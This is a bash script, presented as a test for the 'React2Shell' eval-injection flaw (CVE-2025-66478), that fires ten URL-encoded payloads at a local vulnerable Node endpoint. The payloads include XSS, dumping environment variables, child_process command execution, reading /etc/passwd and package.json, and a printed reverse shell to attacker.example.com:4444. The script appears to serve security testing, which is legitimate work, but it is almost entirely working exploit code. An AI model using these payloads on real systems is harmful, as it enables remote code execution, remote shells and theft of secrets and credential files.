#!/bin/bash

# React2Shell Vulnerability Test - Eval Injection
# Test script for CVE-2025-66478
# WARNING: For testing purposes only on authorized systems!

BASE_URL="http://localhost:3000"
COLORS=true

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}React2Shell - Eval Injection Test Suite${NC}"
echo -e "${BLUE}========================================${NC}\n"

# Test 1: Basic XSS
echo -e "${YELLOW}[TEST 1] Basic XSS Injection${NC}"
PAYLOAD="'); alert('XSS'); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
echo "URL: ${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test1.html
if grep -q "XSS" /tmp/test1.html; then
    echo -e "${GREEN}✓ Payload delivered${NC}\n"
else
    echo -e "${RED}✗ Payload blocked${NC}\n"
fi

# Test 2: Console Access
echo -e "${YELLOW}[TEST 2] Console Access - Environment Variables${NC}"
PAYLOAD="'); console.log(process.env); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
echo "URL: ${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test2.html
echo -e "${GREEN}✓ Request completed${NC}\n"

# Test 3: Module Require (Server-side RCE attempt)
echo -e "${YELLOW}[TEST 3] Module Require - Child Process${NC}"
PAYLOAD="'); require('child_process').exec('whoami', function(e,o){console.log(o)}); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
echo "URL: ${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test3.html
echo -e "${GREEN}✓ RCE payload delivered${NC}\n"

# Test 4: File System Access
echo -e "${YELLOW}[TEST 4] File System Access${NC}"
PAYLOAD="'); const fs=require('fs'); console.log(fs.readdirSync('.')); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test4.html
echo -e "${GREEN}✓ File system access attempt completed${NC}\n"

# Test 5: Global Object Manipulation
echo -e "${YELLOW}[TEST 5] Global Object Manipulation${NC}"
PAYLOAD="'); global.pwned = true; console.log('System compromised'); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test5.html
echo -e "${GREEN}✓ Global manipulation completed${NC}\n"

# Test 6: Reverse Shell Payload (DANGEROUS - Commented)
echo -e "${YELLOW}[TEST 6] Reverse Shell Payload (Simulation)${NC}"
echo "⚠️  DANGEROUS: Reverse shell payload simulation"
PAYLOAD="'); const net=require('net'); const spawn=require('child_process').spawn; const client=new net.Socket(); client.connect(4444,'attacker.example.com',function(){const sh=spawn('/bin/sh',[]); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);}); console.log('"
echo "Payload (not executed): $PAYLOAD"
echo -e "${RED}⚠️  This payload would establish a reverse shell to attacker.example.com:4444${NC}\n"

# Test 7: Environment Variable Extraction
echo -e "${YELLOW}[TEST 7] Environment Variable Extraction${NC}"
PAYLOAD="'); Object.keys(process.env).forEach(key => console.log(key + '=' + process.env[key])); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test7.html
echo -e "${GREEN}✓ Environment extraction completed${NC}\n"

# Test 8: Directory Traversal
echo -e "${YELLOW}[TEST 8] Directory Traversal${NC}"
PAYLOAD="'); const fs=require('fs'); console.log(fs.readFileSync('/etc/passwd','utf8')); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test8.html
echo -e "${GREEN}✓ Directory traversal attempt completed${NC}\n"

# Test 9: Package.json Read
echo -e "${YELLOW}[TEST 9] Package.json Access${NC}"
PAYLOAD="'); const fs=require('fs'); console.log(fs.readFileSync('./package.json','utf8')); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test9.html
echo -e "${GREEN}✓ Package file access completed${NC}\n"

# Test 10: Multiple Command Execution
echo -e "${YELLOW}[TEST 10] Multiple Command Execution${NC}"
PAYLOAD="'); require('child_process').exec('whoami && pwd && ls -la', (e,o,s) => console.log(o)); console.log('"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
echo "Payload: $PAYLOAD"
curl -s "${BASE_URL}/vulnerable/eval-injection?input=${ENCODED_PAYLOAD}" > /tmp/test10.html
echo -e "${GREEN}✓ Multiple command execution completed${NC}\n"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Test Suite Completed${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "\n${YELLOW}Check server console output for execution results${NC}"
echo -e "${RED}⚠️  If any of these tests succeeded, the application is VULNERABLE${NC}\n"
